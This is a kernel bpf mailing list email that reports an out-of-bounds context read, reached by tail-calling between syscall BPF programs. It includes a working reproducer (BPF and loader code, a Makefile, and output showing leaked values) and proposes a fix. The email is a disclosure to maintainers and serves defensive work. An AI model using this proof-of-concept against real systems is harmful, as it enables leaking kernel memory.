Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.82.45
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1795777435;
	b=v5xWI7jIzuxy/hbTd+O5ewUChVsnb2/K4ij7g1V7PTsrUCRoV3d7sIr5WqTvrMENkhOk
	 ah4aLiCQ0Fj++3Tqj5yPTbcIYI7nSMUkOIhcBIYWaxhZ+LZgzVOUqMQOWF6dX6Js8WQQP
	 rgtkkPSpDfFQ8F00LZIiMZv62tVEAoyfVnOo8RvZDrqC7Gi4wrj9HAK4GBtPyj1NysIb3
	 keGFLezv3CKzK1c8/T656Ej17KaO8H6rki4T5nHnigDHExRBvirOdrB9GM86jWfL2GML5
	 /YbxamR3JOY1FdoCdp+wBUanJbZd1kJC+nwgU/LgGaCkof3aCr8+CpW3yA2ZyVeXClw==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795777435;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:MIME-Version:From:Date:
	 X-Gm-Features:Message-ID:Subject:To:Content-Type;
	bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
	b=RmgJmQOTycXHtg1YfIJzTXqQ5uZKs9aSa2zqUSb8TPJNrms1NKwJH9RS9CcfqsUfR4bO
	 8gSITBN7D5gLF9/37kPVD9rl5RuPBBXx/05tIcBsNcDFMnCFToDuVDRA1qLx9lteQc1dv
	 qy/dfEfSCffhwaa14zhbeTbO2b1vRpKYGixklN0TbhvCw+tVcf+JfZ9n+4my3j+TUaa2v
	 lhdK/72n7R+809rB/CKotvyQBUoETJ24Wvn3yRnkAFDhFGI0fraK4zgCfQ+ypL9o4eN8g
	 2NSOWrjB9cLcMleMCnQb+sND2tI7GaG+RPoTwTB+ed+V5BK1XgoN8Aa5LTYOeFgPMDg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=u9n6OxsG;
	arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.82.45
Received: from mail-dl1-f45.google.com (mail-dl1-f45.google.com [74.125.82.45])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ECEB1606A32D
	for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 11:03:54 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org ECEB1606A32D
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=u9n6OxsG
Received: by mail-dl1-f45.google.com with SMTP id a92af1059eb24-1b546061d58so18479014c88.1
        for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 03:03:54 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1795777434; cv=none;
        d=google.com; s=arc-20260327;
        b=kig57sfexD123EhSxQ9PusYb1ZujoIhcIt5LPvpodzOh0cd3jHr4kToz7Z02sIa+Nm
         4QcU0R2bRfBFJ4fKPOtRpCJYnuwqBTsdj/eA8q0o+ercS9PTaCPOdjVFB0HZFEPBy5e0
         8OZBS0ghFe8zSWNBIMIOGEpV5t3YdKq6HWHe9AhWs4gCTT6+cm6TST2xoYkAlyvHWPV4
         957b+2mzpFoMYxvXuwHyrYTAIhr4pF85S9bkK6ADFNF2Z6d9VLQ29HzuNh4ZUXIIMoPn
         y0s/wegFPL5Ll6cY2JBtiLMYAvXtrl2uR2tqlNROosVglgjri5shynhiqgZvnwki2GFk
         wQIw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
        fh=EzXzCgbyZE43JYT8VpZvdMGfP04YCbq1jqk2hq2thO0=;
        b=GuB63fTDPhuKYex5Fz+6HYU4It/L3uwXcbSqVUas9XtYC6LZQ+9z3k8ud3ojyVbEzn
         y3TNElpk9/FYfk5WhzreTN57bnLvSuDheRej/tL/9414eZOEh4VD3tXpFbuFncJTE0Cd
         yK3uitF8D1wzVvHZ6GyAu4bIrxF5r1NGftmMfXZFQJGgZYad4U9YRTYNFpVAfpOfvFwX
         uqlQvpwXfGOTHWjuxkIBzjUnZOmkJl5E9+Ceb8fv4nMKgP5J1eEfYEu6ryo1YbPbl4t5
         PONNQ9RB15WcGhBux+is3vpM/WrU+OKJid+e3YHBAedg8cxOFJ3hpYIqN9DhS0jEhSRB
         t28A==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1795777434; x=1796382234; darn=vger.kernel.org;
        h=content-type:to:subject:message-id:date:from:mime-version:from:to
         :cc:subject:date:message-id:reply-to:content-type;
        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
        b=u9n6OxsG1k3r9Ivy0OMJiUCP7bT9//f7i6t1VpCk6ydyEmhLStc6SK52Ms4YhAZzQB
         5U69r4TVS6uOp2huxePaLT8/3aj7899LHrcpmVYdY+XSRVuHOYuCaumPSCEr+8rdOlHl
         zY/r8R1EmtstZOXDO1c1JLsqfyajHkhKOlm5+ZN+O9/gDmAlhxmjWQbw1AeMWpV/IWfG
         NNitZZ87Y+hsgZ773+05Ps5ktmHm5Mw1XlnvL2xVQ/10+dyLinZevE5tBFBCwuXaUwxR
         bjN47R5TiyhXiVVYdfwjDy8elBo4skX3v0WVhzrnl7eOkEpBSVpPncd7WYtsVPz+UaOD
         iuIA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795777434; x=1796382234;
        h=content-type:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
        b=FCOwxdr6xPujwLzYV5lEcUS+nUDcnc7FanCKWbPobzdZdnafdxVvKRT4QhyVlVbepG
         ADGNhJRx7sYgTOnFgU31EXgcxwThOYZoix7P4JGX8m3iNxbg2QOR5zD7KmJeibdfKkxh
         PyTpWd4PPvFQgtQjDPLAbMNPoq9MSrC+uaWIGLJMtrqHKR5/vJqEDvTPeSjGhcRCzeR6
         NyEr1VMMEYccjqwfjtwC9jR9/8bhZiW99pvgfQxu6Yoxkk3fx9jNj4DvP7npA4HzWHQ1
         +lT1dF47VdW3ttG3wvSxYsQxlFFjgoTbws6gHqEAp2ZoCbTFOz14/1OnP0MSM10QgXpi
         YiDg==
X-Gm-Message-State: APuU4Z8iwvvQ/qRF5dLESScIL6KzKLYR5o4hXpEikOiq4oO195X1c3RL
	fa1yOx2XiL8RKeB0aqd5j183qb1yyHE7igEkO/EsG5jsxstVEGKsgqwlZ5C4/8MJ4bxF2IWtXVz
	XDNJA+Q4gXfBdYiICw0XtsiJUa+LFxqKJ6U6igdl/GnzH
X-Gm-Gg: AZFdTZdPdpCWiAgecqEcRApxeFmQyTH323bR9sLC5zHXG8VSu1R7cqtqBnd0/Ma9x60
	UV7T4p3kaOZapfO3feayYyJl0k5/dGzleYoydnEcNddM3sKgi0DrjHlBVecxRxtrL0gW7GWhAlF
	JQNwx17Y8KVgw5+YW74RgpF/r0/8fUhsIMxClOEZ6b408n1rpjrK5r6UClTPDFqBL/rGIgAT1Px
	F7Yf+zWVx4kD0QCJBop7PnQ9G13VuLzNg+zUCdn1d/W4TCOO6PSncXyG6zxXsSLxg0LgPPt3vrq
	7rOdSrmPJO5sN0z/4I97Gqj/O1gd0xHFpFxL3FhCypt9LNU4tdmI35YdqfvhEYLNUky/ICTlczd
	+QB78YYle5PgZW+tLnhp+IhvyJ/w4GOxEJ3waASc=
X-Received: by 2002:a05:701b:428a:20b0:1b5:1a0d:b544 with SMTP id
 a92af1059eb24-1b5568a145bmr25834569c88.7.1795777433663; Fri, 27 Nov 2026
 03:03:53 -0800 (PST)
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
From: ZNV <mejedi@gmail.com>
Date: Fri, 27 Nov 2026 14:03:40 +0300
X-Gm-Features: Aa3M54rXVy_lxET-Jghtvn0pONWmIyVu3gzJlsfMgOf4WY932yKa0ZePHJ06U7U
Message-ID: <CAAYXoE8ORWnqLVofqZf2AxUvnV_Bd1Gsqb3qdJv+dCM2bVkvAg@mail.gmail.com>
Subject: out of bounds context access with syscall programs + tail calls
To: bpf <bpf@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"

Hi!

Verifier computes prog->aux->max_ctx_access, a buffer passed to
sys_bpf(PROG_RUN) must be at least that big (see
bpf_prog_test_run_syscall).

As far as I can tell, tail call map only enforces that the caller/callee
program types are compatible, ignoring max_ctx_access. It is possible to
chain 2 syscall programs via tail calls; the second one having a larger
max_ctx_access (reproducer follows).

I hope that the fix won't be banning bpf_tail_call in syscall programs.
It should be possible to augment compatibility check done by
bpf_prog_map_compatible. Apparently struct bpf_map_owner has an
alignment gap between .sleepable and .storage_cookie[] that is large
enough to host the 16 bit max_ctx_access.

Reproducer follows. User space invokes syscall1, which in turn
tail-calls syscall2. Syscall2 loads and returns an __u32 at ctx+8192.
Since syscall1 doesn't access ctx at all, sys_bpf(PROG_RUN) permits any
context size. User space invokes syscall1 with different context sizes
and prints the returned value. Size varies to make it less likely for
the context buffer to end up at the same address in subsequent calls,
making syscall2 sample different locations.

Example output:

0
0
ff2950a3
ff2950a3
492f3000
492f3000
7bb8
7bb8
0
0
0
0
0
0
0

k.c:
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

SEC("syscall")
int syscall2(void *ctx)
{
    bpf_printk("syscall2");
    return 2048[(int *)ctx];
}

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 1);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
    __array(values, int (void *));
} prog_array SEC(".maps") = {
    .values = {
        [0] = &syscall2,
    },
};

SEC("syscall")
int syscall1(void *ctx)
{
    bpf_printk("syscall1");
    bpf_tail_call(ctx, &prog_array, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";

syscall-oob.c:
#include <stdio.h>
#include <unistd.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "k.skel.h"

int main(void)
{
    struct k *k = k__open_and_load();
    if (!k) {
        perror("k__open_and_load");
        return 1;
    }

    int fd = bpf_program__fd(k->progs.syscall1);
    int buf[256];
    LIBBPF_OPTS(bpf_test_run_opts, opts, .ctx_in = buf);

    for (int i = 1; i < 16; i++) {
        // do different size classes to avoid sampling the same location
        opts.ctx_size_in = i * 16;
        int rc = bpf_prog_test_run_opts(fd, &opts);
        if (rc != 0) {
            perror("bpf_prog_test_run_opts");
        } else {
            printf("%x\n", opts.retval);
        }
    }

    return 0;
}

Makefile:
syscall-oob: syscall-oob.c k.skel.h
    clang -o syscall-oob syscall-oob.c -lbpf
k.skel.h: k.o
    bpftool gen skeleton k.o > k.skel.h
k.o: k.c
    clang -g -O2 -c -target bpf k.c -isystem
/usr/include/aarch64-linux-gnu/ -isystem
/usr/include/x86_64-linux-gnu/
.PHONY:clean
clean:
    rm -f syscall-oob k.o k.skel.h
